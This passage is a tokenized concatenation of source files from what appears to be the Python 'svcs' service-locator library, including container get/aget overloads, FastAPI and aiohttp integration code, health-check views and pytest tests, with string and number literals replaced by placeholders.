get_registered_service_for ( svc_type ) <EOL> svc = rs . factory ( self ) if rs . takes_container else rs . factory ( ) <EOL> return False , svc , rs . name , rs . enter <EOL> def register_local_factory ( <EOL> self , <EOL> svc_type : type , <EOL> factory : Callable , <EOL> * , <EOL> enter : bool = True , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | Awaitable | None = None , <EOL> ) -> None : <EOL> if self . _lazy_local_registry is None : <EOL> self . _lazy_local_registry = Registry ( ) <EOL> self . _lazy_local_registry . register_factory ( <EOL> svc_type = svc_type , <EOL> factory = factory , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> def register_local_value ( <EOL> self , <EOL> svc_type : type , <EOL> value : object , <EOL> * , <EOL> enter : bool = False , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | Awaitable | None = None , <EOL> ) -> None : <EOL> self . register_local_factory ( <EOL> svc_type , <EOL> lambda : value , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> @ overload <EOL> def get ( self , svc_type : type [ T1 ] , / ) -> T1 : ... <EOL> @ overload <EOL> def get ( <EOL> self , svc_type1 : type [ T1 ] , svc_type2 : type [ T2 ] , / <EOL> ) -> tuple [ T1 , T2 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , svc_type1 : type [ T1 ] , svc_type2 : type [ T2 ] , svc_type3 : type [ T3 ] , / <EOL> ) -> tuple [ T1 , T2 , T3 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 ] : ... <EOL> @ overload <EOL> def get ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> svc_type10 : type [ T10 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 ] : ... <EOL> def get ( self , * svc_types : type ) -> object : <EOL> rv = [ ] <EOL> for svc_type in svc_types : <EOL> cached , svc , name , enter = self . _lookup ( svc_type ) <EOL> if cached : <EOL> rv . append ( svc ) <EOL> continue <EOL> if iscoroutine ( svc ) or isinstance ( <EOL> svc , AbstractAsyncContextManager <EOL> ) : <EOL> msg = "<STR_LIT>" <EOL> raise TypeError ( msg ) <EOL> if enter and isinstance ( svc , AbstractContextManager ) : <EOL> self . _on_close . append ( ( name , svc ) ) <EOL> svc = svc . __enter__ ( ) <EOL> self . _instantiated [ svc_type ] = svc <EOL> rv . append ( svc ) <EOL> if len ( rv ) == <NUM_LIT> : <EOL> return rv [ <NUM_LIT> ] <EOL> return rv <EOL> @ overload <EOL> async def aget ( self , svc_type : type [ T1 ] , / ) -> T1 : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , svc_type1 : type [ T1 ] , svc_type2 : type [ T2 ] , / <EOL> ) -> tuple [ T1 , T2 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , svc_type1 : type [ T1 ] , svc_type2 : type [ T2 ] , svc_type3 : type [ T3 ] , / <EOL> ) -> tuple [ T1 , T2 , T3 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> self , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> svc_type10 : type [ T10 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 ] : ... <EOL> async def aget ( self , * svc_types : type ) -> object : <EOL> rv = [ ] <EOL> for svc_type in svc_types : <EOL> cached , svc , name , enter = self . _lookup ( svc_type ) <EOL> if cached : <EOL> rv . append ( svc ) <EOL> continue <EOL> if enter and isinstance ( svc , AbstractAsyncContextManager ) : <EOL> self . _on_close . append ( ( name , svc ) ) <EOL> svc = await svc . __aenter__ ( ) <EOL> elif isawaitable ( svc ) : <EOL> svc = await svc <EOL> self . _instantiated [ svc_type ] = svc <EOL> rv . append ( svc ) <EOL> if len ( rv ) == <NUM_LIT> : <EOL> return rv [ <NUM_LIT> ] <EOL> return rv <EOL> </s>
<s> import asyncio <EOL> from contextlib import asynccontextmanager <EOL> import pytest <EOL> import svcs <EOL> from tests . helpers import CloseMe <EOL> try : <EOL> from fastapi import FastAPI <EOL> from fastapi . testclient import TestClient <EOL> except ImportError : <EOL> pytest . skip ( "<STR_LIT>" , allow_module_level = True ) <EOL> @ pytest . mark . asyncio ( ) <EOL> @ pytest . mark . parametrize ( "<STR_LIT>" , [ True , False ] ) <EOL> @ pytest . mark . parametrize ( "<STR_LIT>" , [ True , False ] ) <EOL> async def test_integration ( yield_something , cm ) : <EOL> close_me_registry = CloseMe ( ) <EOL> close_me_container = CloseMe ( ) <EOL> async def factory ( ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> yield <NUM_LIT> <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> await close_me_container . aclose ( ) <EOL> async def close_registry ( ) : <EOL> await close_me_registry . aclose ( ) <EOL> if yield_something : <EOL> async def lifespan ( app : FastAPI , registry : svcs . Registry ) : <EOL> registry . register_factory ( <EOL> int , factory , on_registry_close = close_registry <EOL> ) <EOL> yield { "<STR_LIT>" : "<STR_LIT>" } <EOL> else : <EOL> async def lifespan ( app : FastAPI , registry : svcs . Registry ) : <EOL> registry . register_factory ( <EOL> int , factory , on_registry_close = close_registry <EOL> ) <EOL> yield <EOL> if cm : <EOL> lifespan = asynccontextmanager ( lifespan ) <EOL> app = FastAPI ( lifespan = svcs . fastapi . lifespan ( lifespan ) ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def view ( services : svcs . fastapi . DepContainer ) : <EOL> return { "<STR_LIT>" : await services . aget ( int ) } <EOL> with TestClient ( app ) as client : <EOL> assert { "<STR_LIT>" : <NUM_LIT> } == client . get ( "<STR_LIT>" ) . json ( ) <EOL> assert close_me_container . is_aclosed <EOL> assert close_me_registry . is_aclosed <EOL> </s>
<s> from doctest import ELLIPSIS <EOL> import pytest <EOL> from sybil import Sybil <EOL> from sybil . parsers import myst , rest <EOL> import svcs <EOL> from tests . helpers import CloseMe <EOL> from tests . ifaces import Service <EOL> markdown_examples = Sybil ( <EOL> parsers = [ <EOL> myst . DocTestDirectiveParser ( optionflags = ELLIPSIS ) , <EOL> myst . PythonCodeBlockParser ( doctest_optionflags = ELLIPSIS ) , <EOL> myst . SkipParser ( ) , <EOL> ] , <EOL> patterns = [ "<STR_LIT>" ] , <EOL> ) <EOL> rest_examples = Sybil ( <EOL> parsers = [ <EOL> rest . DocTestParser ( optionflags = ELLIPSIS ) , <EOL> rest . PythonCodeBlockParser ( ) , <EOL> ] , <EOL> patterns = [ "<STR_LIT>" ] , <EOL> ) <EOL> pytest_collect_file = ( markdown_examples + rest_examples ) . pytest ( ) <EOL> collect_ignore = [ ] <EOL> try : <EOL> import sphinx <EOL> except ImportError : <EOL> collect_ignore . extend ( [ "<STR_LIT>" ] ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _svc ( ) : <EOL> return Service ( ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _rs ( svc ) : <EOL> return svcs . RegisteredService ( Service , Service , False , True , None ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _registry ( ) : <EOL> return svcs . Registry ( ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _container ( registry ) : <EOL> return svcs . Container ( registry ) <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _close_me ( ) : <EOL> return CloseMe ( ) <EOL> </s>
<s> from __future__ import annotations <EOL> import flask <EOL> import svcs <EOL> bp = flask . Blueprint ( "<STR_LIT>" , __name__ ) <EOL> @ bp . get ( "<STR_LIT>" ) <EOL> def healthy ( ) -> flask . ResponseValue : <EOL> ok : list [ str ] = [ ] <EOL> failing : list [ dict [ str , str ] ] = [ ] <EOL> code = <NUM_LIT> <EOL> for svc in svcs . flask . get_pings ( ) : <EOL> try : <EOL> svc . ping ( ) <EOL> ok . append ( svc . name ) <EOL> except Exception as e : <EOL> failing . append ( { svc . name : repr ( e ) } ) <EOL> code = <NUM_LIT> <EOL> return { "<STR_LIT>" : ok , "<STR_LIT>" : failing } , code <EOL> </s>
<s> from unittest . mock import Mock <EOL> import pytest <EOL> from starlette . testclient import TestClient <EOL> from simple_starlette_app import Database , app , lifespan <EOL> @ pytest . fixture ( name = "<STR_LIT>" ) <EOL> def _client ( ) : <EOL> with TestClient ( app ) as client : <EOL> yield client <EOL> def test_db_goes_boom ( client ) : <EOL> db = Mock ( spec_set = Database ) <EOL> db . get_user . side_effect = Exception ( "<STR_LIT>" ) <EOL> lifespan . registry . register_value ( Database , db ) <EOL> resp = client . get ( "<STR_LIT>" ) <EOL> assert { "<STR_LIT>" : "<STR_LIT>" } == resp . json ( ) <EOL> </s>
<s> from __future__ import annotations <EOL> import sys <EOL> from contextlib import asynccontextmanager <EOL> from typing import AsyncGenerator <EOL> from fastapi import Depends , FastAPI <EOL> from fastapi . responses import JSONResponse <EOL> import svcs <EOL> if sys . version_info < ( <NUM_LIT> , <NUM_LIT> ) : <EOL> from typing_extensions import Annotated <EOL> else : <EOL> from typing import Annotated <EOL> @ svcs . fastapi . lifespan <EOL> async def lifespan ( <EOL> app : FastAPI , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ dict [ str , object ] , None ] : <EOL> yield { } <EOL> reg : svcs . Registry = lifespan . registry <EOL> @ svcs . fastapi . lifespan <EOL> async def lifespan2 ( <EOL> app : FastAPI , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ None , None ] : <EOL> yield <EOL> @ svcs . fastapi . lifespan <EOL> @ asynccontextmanager <EOL> async def lifespan3 ( <EOL> app : FastAPI , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ dict [ str , object ] , None ] : <EOL> yield { } <EOL> @ svcs . fastapi . lifespan <EOL> @ asynccontextmanager <EOL> async def lifespan4 ( <EOL> app : FastAPI , registry : svcs . Registry <EOL> ) -> AsyncGenerator [ None , None ] : <EOL> yield <EOL> app = FastAPI ( lifespan = lifespan ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def view ( <EOL> services : Annotated [ svcs . Container , Depends ( svcs . fastapi . container ) ] <EOL> ) -> JSONResponse : <EOL> x : int = services . get ( int ) <EOL> return JSONResponse ( { } , <NUM_LIT> ) <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def view2 ( services : svcs . fastapi . DepContainer ) -> JSONResponse : <EOL> x : int = services . get ( int ) <EOL> return JSONResponse ( { } , <NUM_LIT> ) <EOL> </s>
<s> import logging . config <EOL> from datetime import datetime <EOL> import svcs <EOL> logging . config . dictConfig ( <EOL> { <EOL> "<STR_LIT>" : <NUM_LIT> , <EOL> "<STR_LIT>" : False , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ "<STR_LIT>" ] , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : False , <EOL> } , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : [ "<STR_LIT>" ] , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> } , <EOL> } <EOL> ) <EOL> reg = svcs . Registry ( ) <EOL> reg . register_factory ( datetime , datetime . now ) <EOL> reg . register_value ( str , "<STR_LIT>" ) <EOL> </s>
<s> from __future__ import annotations <EOL> from collections . abc import Callable <EOL> from contextlib import suppress <EOL> from typing import Any , overload <EOL> from aiohttp import web <EOL> import svcs <EOL> from . _core import ( <EOL> _KEY_CONTAINER , <EOL> _KEY_REGISTRY , <EOL> T1 , <EOL> T2 , <EOL> T3 , <EOL> T4 , <EOL> T5 , <EOL> T6 , <EOL> T7 , <EOL> T8 , <EOL> T9 , <EOL> T10 , <EOL> ) <EOL> try : <EOL> _AIOHTTP_KEY_REGISTRY = web . AppKey ( _KEY_REGISTRY , svcs . Registry ) <EOL> except ( <EOL> AttributeError <EOL> ) : <EOL> _AIOHTTP_KEY_REGISTRY = _KEY_REGISTRY <EOL> _AIOHTTP_KEY_CONTAINER = _KEY_CONTAINER <EOL> def svcs_from ( request : web . Request ) -> svcs . Container : <EOL> return request [ _AIOHTTP_KEY_CONTAINER ] <EOL> def get_registry ( app : web . Application ) -> svcs . Registry : <EOL> return app [ _AIOHTTP_KEY_REGISTRY ] <EOL> def init_app ( <EOL> app : web . Application , <EOL> * , <EOL> registry : svcs . Registry | None = None , <EOL> middleware_pos : int = <NUM_LIT> , <EOL> ) -> web . Application : <EOL> app [ _AIOHTTP_KEY_REGISTRY ] = registry or svcs . Registry ( ) <EOL> app . middlewares . insert ( middleware_pos , svcs_middleware ) <EOL> app . on_cleanup . append ( aclose_registry ) <EOL> return app <EOL> @ web . middleware <EOL> async def svcs_middleware ( <EOL> request : web . Request , handler : Callable <EOL> ) -> web . Response : <EOL> async with svcs . Container ( request . app [ _AIOHTTP_KEY_REGISTRY ] ) as container : <EOL> request [ _AIOHTTP_KEY_CONTAINER ] = container <EOL> return await handler ( request ) <EOL> def register_value ( <EOL> app : web . Application , <EOL> svc_type : type , <EOL> value : object , <EOL> * , <EOL> enter : bool = False , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> get_registry ( app ) . register_value ( <EOL> svc_type , <EOL> value , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> def register_factory ( <EOL> app : web . Application , <EOL> svc_type : type , <EOL> factory : Callable , <EOL> * , <EOL> enter : bool = True , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> get_registry ( app ) . register_factory ( <EOL> svc_type , <EOL> factory , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> async def aclose_registry ( app : web . Application ) -> None : <EOL> with suppress ( KeyError ) : <EOL> await get_registry ( app ) . aclose ( ) <EOL> def get_pings ( request : web . Request ) -> list [ svcs . ServicePing ] : <EOL> return svcs_from ( request ) . get_pings ( ) <EOL> async def aget_abstract ( request : web . Request , * svc_types : type ) -> Any : <EOL> return await svcs_from ( request ) . aget_abstract ( * svc_types ) <EOL> @ overload <EOL> async def aget ( request : web . Request , svc_type : type [ T1 ] , / ) -> T1 : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , svc_type1 : type [ T1 ] , svc_type2 : type [ T2 ] , / <EOL> ) -> tuple [ T1 , T2 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 ] : ... <EOL> @ overload <EOL> async def aget ( <EOL> request : web . Request , <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> svc_type10 : type [ T10 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 ] : ... <EOL> async def aget ( request : web . Request , * svc_types : type ) -> object : <EOL> return await svcs_from ( request ) . aget ( * svc_types ) <EOL> </s>
<s> from __future__ import annotations <EOL> from aiohttp . web import Request , Response , json_response <EOL> import svcs <EOL> async def healthy_view ( request : Request ) -> Response : <EOL> ok : list [ str ] = [ ] <EOL> failing : list [ dict [ str , str ] ] = [ ] <EOL> code = <NUM_LIT> <EOL> for svc in svcs . aiohttp . get_pings ( request ) : <EOL> try : <EOL> await svc . aping ( ) <EOL> ok . append ( svc . name ) <EOL> except Exception as e : <EOL> failing . append ( { svc . name : repr ( e ) } ) <EOL> code = <NUM_LIT> <EOL> return json_response ( { "<STR_LIT>" : ok , "<STR_LIT>" : failing } , status = code ) <EOL> </s>
<s> import asyncio <EOL> import re <EOL> from contextlib import ( <EOL> AbstractAsyncContextManager , <EOL> AbstractContextManager , <EOL> asynccontextmanager , <EOL> contextmanager , <EOL> ) <EOL> from typing import NewType <EOL> import pytest <EOL> import svcs <EOL> from . fake_factories import ( <EOL> async_bool_cm_factory , <EOL> async_int_factory , <EOL> async_str_gen_factory , <EOL> ) <EOL> from . helpers import Annotated , CloseMe , nop <EOL> from . ifaces import AnotherService , Interface , Service , YetAnotherService <EOL> def test_register_factory_get ( registry , container ) : <EOL> registry . register_factory ( Service , Service ) <EOL> svc = container . get ( Service ) <EOL> assert isinstance ( svc , Service ) <EOL> assert svc is container . get ( Service ) <EOL> def test_register_factory_get_abstract ( registry , container ) : <EOL> registry . register_factory ( Interface , Service ) <EOL> svc = container . get_abstract ( Interface ) <EOL> assert isinstance ( svc , Interface ) <EOL> assert svc is container . get ( Interface ) <EOL> def test_register_value_multiple ( registry , container ) : <EOL> registry . register_value ( Service , <NUM_LIT> ) <EOL> registry . register_value ( AnotherService , <NUM_LIT> ) <EOL> assert [ <NUM_LIT> , <NUM_LIT> ] == container . get ( Service , AnotherService ) <EOL> assert [ <NUM_LIT> , <NUM_LIT> ] == container . get ( Service , AnotherService ) <EOL> S1 = Annotated [ Interface , "<STR_LIT>" ] <EOL> S2 = NewType ( "<STR_LIT>" , Interface ) <EOL> def test_get_annotated_multiple ( registry , container ) : <EOL> registry . register_factory ( S1 , Service ) <EOL> registry . register_factory ( S2 , AnotherService ) <EOL> assert isinstance ( container . get ( S1 ) , Service ) <EOL> assert isinstance ( container . get ( S2 ) , AnotherService ) <EOL> def test_get_not_found ( container ) : <EOL> with pytest . raises ( svcs . exceptions . ServiceNotFoundError ) as ei : <EOL> container . get ( Service ) <EOL> assert Service is ei . value . args [ <NUM_LIT> ] <EOL> def test_passes_container_bc_name ( registry , container ) : <EOL> def factory ( svcs_container ) : <EOL> return str ( svcs_container . get ( int ) ) <EOL> registry . register_value ( int , <NUM_LIT> ) <EOL> registry . register_factory ( str , factory ) <EOL> assert "<STR_LIT>" == container . get ( str ) <EOL> def test_passes_container_bc_annotation ( registry , container ) : <EOL> def factory ( foo : svcs . Container ) : <EOL> return str ( foo . get ( int ) ) <EOL> registry . register_value ( int , <NUM_LIT> ) <EOL> registry . register_factory ( str , factory ) <EOL> assert "<STR_LIT>" == container . get ( str ) <EOL> def test_get_enter_false ( registry , container ) : <EOL> entered = False <EOL> @ contextmanager <EOL> def factory ( ) : <EOL> nonlocal entered <EOL> entered = True <EOL> yield <NUM_LIT> <EOL> registry . register_factory ( Service , factory , enter = False ) <EOL> cm = container . get ( Service ) <EOL> assert not entered <EOL> assert isinstance ( cm , AbstractContextManager ) <EOL> with cm as i : <EOL> assert <NUM_LIT> == i <EOL> assert entered <EOL> def test_get_pings ( registry , container , svc ) : <EOL> registry . register_factory ( AnotherService , AnotherService ) <EOL> registry . register_value ( Service , svc , ping = nop ) <EOL> assert [ Service ] == [ ping . _svc_type for ping in container . get_pings ( ) ] <EOL> def test_cleanup_called ( registry , container , close_me ) : <EOL> def factory ( ) : <EOL> yield <NUM_LIT> <EOL> close_me . close ( ) <EOL> registry . register_factory ( Service , factory ) <EOL> container . get ( Service ) <EOL> assert not close_me . is_closed <EOL> container . close ( ) <EOL> assert close_me . is_closed <EOL> assert not container . _instantiated <EOL> assert not container . _on_close <EOL> def test_close_resilient ( container , registry , caplog , close_me ) : <EOL> def factory ( ) : <EOL> yield <NUM_LIT> <EOL> raise Exception <EOL> def factory_no_boom ( ) : <EOL> yield <NUM_LIT> <EOL> close_me . close ( ) <EOL> registry . register_factory ( Service , factory ) <EOL> registry . register_factory ( YetAnotherService , factory_no_boom ) <EOL> assert <NUM_LIT> == container . get ( Service ) <EOL> assert <NUM_LIT> == container . get ( YetAnotherService ) <EOL> assert not close_me . is_closed <EOL> container . close ( ) <EOL> assert "<STR_LIT>" == caplog . records [ <NUM_LIT> ] . svcs_service_name <EOL> assert close_me . is_closed <EOL> def test_none_is_a_valid_factory_result ( registry , container ) : <EOL> i = <NUM_LIT> <EOL> def factory ( ) : <EOL> nonlocal i <EOL> i += <NUM_LIT> <EOL> yield None <EOL> registry . register_factory ( Service , factory ) <EOL> assert None is container . get ( Service ) <EOL> assert None is container . get ( Service ) <EOL> assert <NUM_LIT> == i <EOL> container . close ( ) <EOL> @ pytest . mark . parametrize ( <EOL> "<STR_LIT>" , <EOL> [ <EOL> async_int_factory , <EOL> async_str_gen_factory , <EOL> async_bool_cm_factory , <EOL> ] , <EOL> ) <EOL> def test_get_on_async_factory_raises_type_error ( <EOL> registry , container , factory , recwarn <EOL> ) : <EOL> registry . register_factory ( Service , factory ) <EOL> with pytest . raises ( <EOL> TypeError , match = re . escape ( "<STR_LIT>" ) <EOL> ) : <EOL> container . get ( Service ) <EOL> if recwarn . list : <EOL> assert ( <EOL> "<STR_LIT>" , <EOL> ) == recwarn . pop ( ) . message . args <EOL> def test_local_value_overrides_global_value ( 